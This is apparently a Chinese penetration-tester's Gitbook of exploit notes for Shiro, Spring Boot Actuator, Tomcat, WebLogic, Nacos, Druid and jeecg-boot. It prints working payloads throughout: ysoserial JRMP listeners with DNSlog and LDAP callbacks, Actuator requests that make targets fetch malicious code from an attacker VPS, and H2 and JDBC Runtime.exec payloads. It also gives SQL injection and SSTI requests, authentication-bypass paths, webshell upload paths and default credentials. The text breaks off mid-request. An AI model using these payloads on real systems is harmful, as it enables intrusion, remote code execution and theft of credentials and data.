发送payload 人家工具已经实现了 注入内存马 有key无链 用现在公开的 dns或者延迟探测 爆破试探存在的class包 工具都现成的 然后根据存在的包判断版本差异自己构造组合链 都知道官方链方便盯着关键函数，通用的rce链基本都藏着官方修复都没得玩 现在比较多的是利用第三方服务比如mysql redis jdbc 通过有限操作的链去利用 链子多的工具：shiro-tool ，经常识别出JRMP Cilent（🥦🐕只会用工具） shiro反序列漏洞中JRMPClient利用 (qq.com) shiro JRMP gadget | BlogPapers (sumsec.me) ysoserial起JRMP服务 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 \"ping w3dh1h.dnslog.cn\" java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 \"ldap://ip:1389/Basic/Command/Whoami\" 由于Shiro重写了resolveClass方法，将原生方法中的forName方法替换为loadClass方法，由于loadClass无法加载数组类型的类，因此存在Transformer[]类的CommonCollections gadget无法成功利用此漏洞，（例如ysoserial CommonCollections1、CommonCollections3） 思路： shiro默认是没有cc依赖的，但是存在commons-beanutils 1.8.3依赖 工具识别问题 比如302跳转，burp插件识别出来了，但是工具识别不出来 解决：工具走burp代理，将响应302改为200 身份验证绕过漏洞 shiro权限管理原理 Shiro的认证授权流程 当我们的用户(subject)去认证的时候，用户携带我们的身份信息，凭据信息，也就是我们的用户名和密码 Shiro会将我们的用户名和密码封装成一个Token 然后通过安全管理器(SecurityManager) 安全管理器(SecurityManager)去调用认证器(Authenticator) 认证器(Authenticator)去调用我们的Realm去获取数据，然后进行比对，如果对比成功的话，那么就认证成功了，否则认证失败。 认证成功后会调用授权器（Authorizer）来判断这个用户身份有什么权限，他可以访问哪些资源。 SessionManager是一个会话管理器，，shiro框架定义了一套会话管理， 它不依赖web容器的session，所以shiro可以使用在非web 应用上，也可以将分布式应用的会话集中在一点管理，此 特性可使它实现单点登录。 SessionDAO其实就是会话，比如要将Session存储到数据库，那么可以通过jdbc来存储到数据库。 Spring+Shiro关键代码 shiro.ini [users] user=user,user admin=admin,admin [roles] admin=* user=user 定义了两个用户和两个角色。其中，admin角色拥有所有权限，而user角色只拥有user权限。这意味着admin用户具有所有权限，而user用户仅具有user权限 Filter链 ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean(); //给filter设置安全管理器 shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager); //配置路径访问 Map map = new HashMap(); map.put(\"/secret.html\", \"authc, roles[admin]\"); map.put(\"/**\", \"anon\"); //默认认证界面路径---当认证不通过时跳转 shiroFilterFactoryBean.setLoginUrl(\"/login.html\"); shiroFilterFactoryBean.setUnauthorizedUrl(\"/unauthorized.html\"); // 设置URL路径与过滤器的映射关系 shiroFilterFactoryBean.setFilterChainDefinitionMap(map); 解释 所有以 / 开头的路径（包括子路径）都可以匿名访问，无需认证和授权。但是，只有经过认证的用户并有admin 角色授权才能访问 /secret.html 路径，当未经身份验证的用户访问需要身份验证的资源如/secret.html时将被重定向到/login.html，当经过身份验证的用户（user）访问不符合其访问权限的资源/secret.html时将被重定向到/unauthorized.html // AntPathMatcher匹配规则 ? 匹配任意一个单字符 * 匹配任意数量的字符 即/admin/* 可以匹配 /admin/a 但是不能匹配 /admin/b/c/d ** 匹配一个或多个目录 即/admin/** 可以匹配 /admin/a 或者 /admin/b/c/d 等请求 // 常见过滤器 anon（匿名访问）：允许匿名访问，不需要认证。 authc（身份验证）：要求用户进行身份验证（登录）才能访问。 user（记住我或身份验证通过）：用户已进行身份验证或选择了记住我功能可访问。 perms（权限控制）：要求用户具有特定的权限才能访问。 roles（角色控制）：要求用户具有特定的角色才能访问。 port（端口控制）：要求请求的端口与指定的端口匹配才能访问。 ssl（SSL安全）：要求请求通过SSL/TLS协议进行安全访问。 rest（RESTful风格支持）：为RESTful API提供支持。 // ShiroFilterFactoryBean常用方法 setLoginUrl(String loginUrl) 设置登录页面的URL未经身份验证的用户访问需要身份验证的资源时将被重定向到该URL setSuccessUrl(String successUrl) 设置成功登录后跳转的URL setUnauthorizedUrl(String unauthorizedUrl) 设置未授权页面的URL，当用户没有访问权限时将被重定向到该URL 身份验证绕过 大部分权限绕过都源自于Spring和Shiro对请求处理的不一致导致的。 Shiro 历史漏洞分析 - 先知社区 (aliyun.com) 编号 版本影响 鉴权路径 绕过payload 后端配置 CVE-2023-22602 Apache Shiro =2.6 /admin /admin/.. CVE-2022-32532 Shiro /admin /admin/%0d，/admin/%0a RegExPatternMatcher&&/admin/.* CVE-2020-1957 Shiro /admin /xxx/..;/admin/（xxx为授权路径） CVE-2016-6802 shrio /admin /xxx/../admin（xxx随意不存在也行） CVE-2020-11989 shiro /admin (shiro等于1.5.2） /admin%25%32%66（%25%32%66为/的双重url编码） (shiro小于1.5.3）/;/admin (shiro等于1.5.2）/admin/* = authc； (shiro小于1.5.3）/admin/* = authc && /** = anon CVE-2020-13933 Shiro /admin /admin/%3Bxxx（xxx为随意字符串） /admin/* = authc CVE-2020-17510 Shiro /admin /admin/%2e /admin/* = authc CVE-2020-17523 Shiro /admin /admin%20 /admin/* = authc 参考文章 Shiro 组件漏洞与攻击链分析 Shiro RememberMe 漏洞检测的探索之路 Shiro反序列化漏洞笔记五（对抗篇） (changxia3.com) shiro反序列化绕WAF之未知HTTP请求方法 | 回忆飘如雪 (gv7.me) shiro权限绕过总结 (qq.com) Shiro从入门到权限绕过漏洞 - 先知社区 (aliyun.com) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:43:37 "},"01.渗透测试/05.漏洞复现/spring漏洞复现.html":{"url":"01.渗透测试/05.漏洞复现/spring漏洞复现.html","title":"Spring框架漏洞","keywords":"","body":"Spring概述 Spring Framework 是一个开源的应用程序框架和 Java 平台的控制容器的反转。由于其强大的功能和易用性，它在行业中被各种程序和系统广泛使用。一些知名产品如 Spring Boot 和 Spring Cloud 都是使用 Spring Framework 开发的。 框架特征 如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶 FoFa语法 icon_hash=\"116323821\" 如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图： FoFa语法 body=\"Whitelabel Error Page\" Spring Boot Actuator未授权访问 Actuator概述 ​ Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。 ​ 其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有： 版本问题 Spring Boot Spring Boot >= 1.5：默认只允许访问 /health 和 /info 端点，但是此安全性通常被应用程序开发人员禁用了 Spring Boot2.x相比于1.x版本的端点多了个前缀 /actuator，如/health 变成了/actuator/health。 端点路径 设置管理端点的路径: 在1.x版本下，设置语句如下: management.context-path =/manage 此时端点的访问方式就变为了: /manage/dump /manage/autoconfig /manage/metrics ... 在2.x版本，设置语句如下: management.endpoints.web.base-path=/manage 此时端点的访问方式就变为了: # /actuator被manage代替 /manage/dump /manage/autoconfig /manage/metrics ... 有些人可能喜欢将其命名为monitor,所以知道这个特点，我们可以适当丰富下自己的字典。 Actuator端点利用 /mappings 泄露路由信息 /trace，/httptrace 获取基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等） 存在的隐患：如果存在登录用户的操作请求，可以窃取用户凭证。 注意：这个只是显示最近的100条数据，但是我们可以写脚本来持续监控。 /env 获取全部环境属性 存在的隐患 可能会泄露数据库账号密码等敏感信息,但是泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式 Spring eureka xstream RCE /heapdump Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照 Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息 通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文,accesskey等 访问后会下载heapdump heapdump分析工具 wyzxxz/heapdump_tool: heapdump敏感信息查询工具，例如查找 spring heapdump中的密码明文，AK,SK等 基于JAVA自带的jhat，通过jhat解析heapdump文件 JDumpSpider java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump /redis/info 如果开放了redis服务（1234端口），可以尝试使用/actuator/redis/info语句看是否能读取敏感信息，如：http://www.xxx.com:1234/actuator/redis/info Spring eureka xstream RCE 利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用的 eureka-client spring-cloud-starter-netflix-eureka-client 依赖中） 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 复现 修改要执行的命令后 起一个恶意eureka server 设置eureka.client.serviceUrl.defaultZone 属性为恶意的外部 eureka server URL 地址 # spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example # spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example\"} refresh 触发目标机器请求远程 URL，提前架设的 eureka server 就会返回恶意的 payload # spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded # spring 2.x POST /actuator/refresh Content-Type: application/json 从而触发 XStream 反序列化，造成 RCE 漏洞 执行完命令后记得恢复，如果不恢复的话，那么命令就会一直执行，系统也会一直报错，将eureka.client.serviceUrl.defaultZone属性设置为原来的即可。 ​ Spring cloud SnakeYAML RCE 版本影响 目标依赖的 spring-cloud-starter 版本 \\ 复现 本地生成yaml-payload的jar包,命令为 生成利用该jar包的example.yml文件 挂载服务 设置spring.cloud.bootstrap.location 属性为外部恶意 yml 文件 URL 地址 # spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example.yml # spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example.yml\"} refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容 # spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded # spring 2.x POST /actuator/refresh Content-Type: application/json SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作,先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化,实例化类时执行恶意代码，造成 RCE 漏洞 注入内存马 Spring restart h2 database query RCE 版本影响 存在 com.h2database.h2 依赖（版本要求暂未知） 复现 hackbar需要将原本的content-type删除，然后选择application/json才可以发送Content-Type: application/json的请求 POST /actuator/env Content-Type: application/json {\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');\"} POST /actuator/restart Content-Type: application/json 需要注意的是payload 中的 'T5' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发 Spring Cloud Gateway SPEL RCE Spring Cloud Gateway是Spring中的一个API网关。存在SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。 版本影响 Spring Cloud Gateway 3.1.0 3.0.0 to 3.0.6 Older, unsupported versions are also affected 复现 添加一个包含恶意SpEL表达式的路由/actuator/gateway/routes/hacktest 应用刚添加的路由/actuator/gateway/refresh 访问恶意路由得到结果/actuator/gateway/routes/hacktest Cloud Function SPEL RCE Spring Cloud Function 是Spring cloud中的serverless框架。 Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。 攻击者可通过该漏洞执行任意代码。 版本影响 org.springframework.cloud:spring-cloud-function-context（影响版本：3.0.0.RELEASE~3.2.2） 复现 accept需要修改 spring-core-rce 版本影响 使用JDK9及以上版本的Spring MVC框架 spring-webmvc 或 spring-webflux依赖 spring framework 5.3.0-5.3.17、5.2.0-5.2.19版本，以及更早的版本 复现 这里环境用vulfocus的，vulhub的不知道为啥不行 docker pull vulfocus/spring-core-rce-2022-03-29 docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29 攻击原理 通过修改Tomcat的日志路径与后缀写入jsp木马 脚本：https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE 需要注意的是每次向webhsell请求时都会再次向其写入木马内容 可以通过以下请求进行清除 /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= 总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。 权限绕过 /admin/%0a /admin/%0d # CVE-2023-20860 /admin/** 复现 参考文章 LandGrey/SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list https://xz.aliyun.com/t/9763 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:47:24 "},"01.渗透测试/05.漏洞复现/Tomcat.html":{"url":"01.渗透测试/05.漏洞复现/Tomcat.html","title":"Tomcat漏洞","keywords":"","body":"环境搭建 vulhub Tomat了解 目录结构 webapps 1. bin目录: 存放一些二进制的文件，例如Tomcat常用的 启动脚本: startup.bat或startup.sh 关闭脚本: shutdown.bat 或 shutdown.sh等等 2. conf目录: 存放的是Tomcat的配置文件 server.xml：可以设置端口号、设置域名或IP、默认加载的项目、请求编码 web.xml：部署描述文件，这个web.xml中描述了一些默认的servlet，部署每个webapp时，都会调用这个文件，配置该web应用的默认servlet context.xml：可以用来配置数据源之类的 tomcat-users.xml：用来配置管理tomcat的用户与权限 Catalina:可以设置默认加载的项目 3. lib目录: 存放的是全局的jar包 4. logs目录: 存放的是Tomcat的日志，如果Tomcat出错什么的，就需要在这里的日志中查找问题 5. temp目录: 存放的是临时性的文件 6. webapps目录: 存放的是Java的Web项目，要部署的项目就需要放在这个目录当中 7. work目录: 存放的是由JSP代码翻译的Java代码，以及编译的.class文件 fofa语法 title=\"Apache Tomcat\" server=\"Tomcat\" 版本号：在Tomcat后面添加/x.x Tomcat漏洞 manager弱口令+部署war包getshell 影响版本 Tomcat7+或者配置错误 复现 conf/tomcat-users.xml中保存了登录凭证，导致可能存在弱口令漏洞，从而能访问Manager APP上传后门。 进入manager界面后可以部署war包 ​ war包为jsp压缩文件（jar cvf xxx.jsp），Tomcat会自动解压， 如将shell.jsp打包为shell.war，Tomcat会将其解压为/shell/shell.jsp 修复方案 删除manage目录或者修改conf/tomcat-users.xml中的用户凭证 PUT任意文件上传（CVE-2017-12615） 影响版本 7.0.0 复现 conf/web.xml文件配置了readonly=false，导致可以写文件 PUT /1.jsp/ HTTP/1.1 Host: 192.168.174.129:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 693 shell 需要进行绕过 Windows： 1、利用/shell.jsp::$DATA的方式绕过 2、/shell.jsp%20，空格绕过 3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/ Linux： 1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/ 返回201表示上传成功 修复方案 conf/web.xml文件配置readonly值为True或注释该参数 AJP文件包含/读取--Ghostcat幽灵猫（CVE-2020-1938） 影响版本 漏洞危害 复现 python2运行 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件 漏洞检测与修复 CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析 | 回忆飘如雪 (gv7.me) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:47:35 "},"01.渗透测试/05.漏洞复现/Weblogic.html":{"url":"01.渗透测试/05.漏洞复现/Weblogic.html","title":"Weblogic漏洞","keywords":"","body":"Weblogic控制台中文显示还是英文显示，浏览器语言设置决定的_sxusky的博客-CSDN博客 特征 第一次访问路径 /console 管理台页面和版本 版本号判断 第21篇：判断Weblogic详细版本号的方法总结 (qq.com) 漏洞复现 Weblogic洞实在太多了。。 配合文件读取来读取管理员账密 config.xml：搜索 密码解密 密钥：SerializedSystemIni.dat（二进制文件，使用burp保存） 解密 进入管理界面部署war包 访问shell/shell.jsp 文件包含--CVE-2022-21371 影响版本：12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0 GET .//META-INF/MANIFEST.MF GET .//WEB-INF/web.xml GET .//WEB-INF/portlet.xml GET .//WEB-INF/weblogic.xml SSRF-CVE-2014-4210 漏洞位置在uddiexplorer/SearchPublicRegistries.jsp 搜索An error has occurred定位返回值 访问存在的端口，返回状态码 访问不存在的端口，返回could not connect over HTTP to server 如果访问的端口不是http协议，则会返回did not have a valid SOAP content-type 服务探测总结 SSRF打Redis 在Weblogic的SSRF中，有一个比较大的特点，就是虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 任意文件上传漏洞（CVE-2018-2894） https://paper.seebug.org/647 产生原因 需要知道部署应用的web目录 开启了Web Service Test Page，开发模式下可未授权访问/ws_utc/Config.do或者认证后访问/ws_utc/begin.do 复现 首先需要设置home dir为静态目录 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css Config.do 返回的数据包 上传后的文件位置 /ws_utc/css/config/keystore/[时间戳]_[文件名] begin.do 将发送的时间戳进行转换：2023-08-19 06:27:55.426 服务器实际上的 所以毫秒处需要进行爆破 上传后的文件位置 /ws_utc/css/upload/RS_Upload_2023-08-19_06-27-55_[毫秒]/import_file_name_[文件名] 身份校验绕过 # CVE-2020-14750 /console/images/%252E./console.portal /console/css/%252E./console.portal # CVE-2020-14882 /console/css/%252e%252e%252fconsole.portal /console/images/%252e%252e%252fconsole.portal 反序列化漏洞 Weblogic漏洞学习：T3反序列化 - 先知社区 (aliyun.com) Weblogic Xmldecoder反序列化中的命令回显与内存马总结 - 先知社区 (aliyun.com) 直接通过T3协议发送恶意反序列化对象 利用T3协议/IIOP协议配合RMP或ND接口反向发送反序列化数据 通过 javabean XML方式发送反序列化数据。 T3协议数据包 第二到第七部分内容，开头都是ac ed 00 05，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了 Payload数据包 问题 waf绕过 https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA 文件包含判断版本号？ weblogic_scanner 这个工具经常提示需要进一步验证的两个漏洞（没成功过。。） CVE-2019-2618：需要知道weblogic的管理员账密进行任意文件上次上传 CVE-2019-2888：先起一个恶意的xxe服务，再用exp打 Web路径 记一次曲折的weblogic上传webshell | chaser's Blog (chaserw.github.io) 假设上传的jsp为shell.jsp # 物理路径 /Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp # 访问路径 https://xx.com/console/framework/skins/wlsconsole/images/shell.jsp # 物理路径 /Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/随机字符/war/shell.jsp # 访问路径 https://xx.com/bea_wls_internal/shell.jsp # 物理路径 /Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/随机字符/war/shell.jsp # 访问路径 https://xx.com/uddiexplorer/shell.jsp # 物理路径 /Oracle/Middleware/user_projects/domains/application/servers/AdminServer/tmp/_WL_user/项目名/随机字符/war/shell.jsp # 访问路径 https://xx.com/项目名/shell.jsp Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:48:06 "},"01.渗透测试/05.漏洞复现/应用记录.html":{"url":"01.渗透测试/05.漏洞复现/应用记录.html","title":"渗透中常见应用记录","keywords":"","body":"Web应用 CMS 阿里系 JAVA 国内软件 数据库 API 云相关 Laravel druid monitor fastjson 畅捷 常见数据库 Wsdl接口 OSS ThinkPHP Nacos log4j 海康威视 Redis Swagger接口 docker逃逸 Drupal hessian组件 Thymeleaf 各种OA ES Webpack Minio DeadCMS Weblogic H3C MQTT（物联网协议） GraphQL Harbor Wordpress shiro 金蝶云星空 Rancher Joomla spring jeecg-boot JBOSS 若依 帆软 phpstudy 泛微 泛微云桥 https://mp.weixin.qq.com/s/BwJJPf5S-SKzChuDGl9i5w 泛微 Nacos 一个易于使用的动态服务发现、配置和服务管理平台，用于构建云原生应用程序。 默认开放在在8848端口+/nacos，默认口令nacos/nacos RCE Nacos结合Spring Cloud Gateway RCE利用 - 先知社区 (aliyun.com) c0olw/NacosRce: Nacos JRaft Hessian 反序列化 RCE 加载字节码 注入内存马 不出网利用 (github.com) 鉴权相关 相关接口 用户查看 /nacos/v1/auth/users?pageNo=1&pageSize=2&search=blur 用户注册 /nacos/v1/auth/users POST：username=crow&password=crow&search=blur /nacos/v1/auth/users?username=crow&password=crow&search=blur 配置信息相关 /nacos/v1/console/namespaces # 查看命名空间 /v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99 # 查看pubilc配置 /nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99&tenant=namespace # 查看指定命名空间配置 nacos/v1/cs/configs?export=true&tenant=namespace&group=&appName=&ids= # 导出指定命名空间配置 权限绕过 -User-Agent: Nacos-Server（低版本直接访问url，1.2~1.4可以尝试添加UA头来绕过鉴权） -serverIdentity: security（nacos开启权限认证的默认值） -example:example -test:test Nacos 默认 secret.key 配置不当权限绕过漏洞（CNVD-2023674205） -Nacos nacos使用外置derby数据库没有鉴权导致的任意select查询操作 ```bash /nacos/v1/cs/ops/derby?sql=select from sys.systables # 所有表 /nacos/v1/cs/ops/derby?sql=select from CONFIG_INFO # 当前配置 /nacos/v1/cs/ops/derby?sql=select from HIS_CONFIG_INFO # 历史配置 /nacos/v1/cs/ops/derby?sql=select from users # 用户 bypass /nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad&sql=/%0a*--/%25&q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%&sql=%0afrom--/&sql=/%0ausers derby数据库如何实现RCE - lvyyevd's 安全博客 http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce - 密码解密 ```bash nacos使用的加密方式为Bcrypt加密，破解小工具https://link.zhihu.com/?target=https%3A//gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar 工具 pap1rman/postnacos: 哥斯拉nacos后渗透插件 maketoken adduser (github.com) charonlight/NacosExploitGUI: Nacos综合漏洞利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用 (github.com) Nacos derby Rce 条件 Nacos版本2.3.2或者2.4.0等 能访问removal和derby接口（权限问题） exp利用 VPS起恶意类，利用removal接口创建用户自定义函数，最后利用derby接口执行sql语句（执行自定义函数） removal接口会遍历并执行用户上传的文件的每一行，这里相当于给了两个条件： 1. 可以执行任意SQL语句 2. 可以执行多个SQL语句 修改恶意类内容来执行相关操作 # 调用sqlj.install_jar方法安装一个jar包 CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\\n # 调用SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY方法设置数据库属性,derby.database.classpath定义了数据库的类路径，即可以在数据库中调用jar包中的方法 CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\\n # 创建用户自定义函数 CREATE FUNCTION S_EXAMPLE_1(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) # 返回最多 2000 个字符的字符串 PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec' # 指定了实现该函数的外部 Java 方法的完全限定名，test.poc 包中的 Example 类的 exec 方法 # 调用自定义函数 SELECT S_EXAMPLE_1('传参') Nacos Jraft Hessian反序列化 https://mp.weixin.qq.com/s/0J0K0iY3bcmYcOuPGymAlQ 1.4.1 1.4.0、2.0.0 ​ Alibaba druid monitor Druid是阿里巴巴数据库事业部出品，为监控而生的数据库连接池 监控SQL的执行时间、监控Web URI的请求、Session监控. 未授权访问路径： /druid/index.html /druid/websession.html /druid/weburi.html /druid/basic.json /druid/websession.json /druid/weburi.json 需要登陆的话，登录入口路径： /druid/login.html 利用姿势： Session监控获取用户身份（session可能是过期的无用，需要爆破验证;网站不使用session来进行鉴权，所以无用） URI获取后台路径：测试未授权访问，或者配合session进行后台操作 Jumpserver /api/v1/terminal/sessions/ # 获取敏感信息录像 /api/v1/ops/playbook/e0adabef-c38f-492d-bd92-832bacc3df5f/file/?key=../../../../../../../etc/passwd # 登录后才能使用 jeecg-boot 组件 /jeecg-boot/druid/index.html # admin/123456 /jeecg-boot/actuator # 一般存在httptrace端点 /jeecg-boot/doc.html，/jeecg-boot/swagger-ui.html #Basic认证 jeecg/jeecg1314 /jeecg-boot/v2/api-docs rabitmq http://localhost:15672 guest/guest nacos（服务注册发现和统一配置中心）http://localhost:8848/nacos nacos/nacos xxl-job-admin（分布式定时任务） http://localhost:9080/xxl-job-admin admin/123456 redis （缓存） 127.0.0.1:6379 密码空 相关接口 GET /jeecg-boot/sys/user/exportXls # 导出用户 GET /jeecg-boot/sys/user/list # 查询用户列表 GET /jeecg-boot/sxams/mysqlbackup/list # 查看数据库备份 GET /jeecg-boot/sys/sysAnnouncementSend/getMyAnnouncementSend # 消息通知 GET /jeecg-boot/sys/dataSource/list #获取数据库相关信息 # 修改密码 PUT /jeecg-boot/sys/user/changePassword Content-Type: application/json {\"username\":\"1231222\",\"password\":\"Qwer1234!\",\"confirmpassword\":\"Qwer1234!\"} 未授权查询（可以查询到用户名和电话号码） /jeecg-boot/sys/user/querySysUser?username=admin 未授权sql注入（报错注入） POST /jeecg-boot/jmreport/qurestSql {\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '\"} SSTI注入 POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1 Host: 192.168.90.1:3100 Origin: http://192.168.90.1:3100 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 123 {\"sql\":\"select 'result: ${ ex(\\\"open -a calculator.app \\\") }' \"} JDBC POST /jeecgboot/jmreport/testConnection HTTP/1.1 Host: 192.168.90.1:3100 Content-Length: 383 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Content-Type: application/json;charset=UTF-8 Origin: http://192.168.90.1:3100 Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close { \"id\": \"1\", \"code\": \"dataSource1\", \"dbType\": \"H2\", \"dbDriver\": \"org.h2.Driver\", \"dbUrl\": \"jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\\u000A$$\", \"dbName\": \"test\", \"dbUsername\": \"sa\", \"dbPassword\": \"\", \"connectTimes\": 5 } 文件读取 POST /fzsubway/jmreport/testConnection HTTP/1.1 Host: xxx Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=38218C16E4022462F885161A2E0C4CCB; AntiLeech=2682583728; 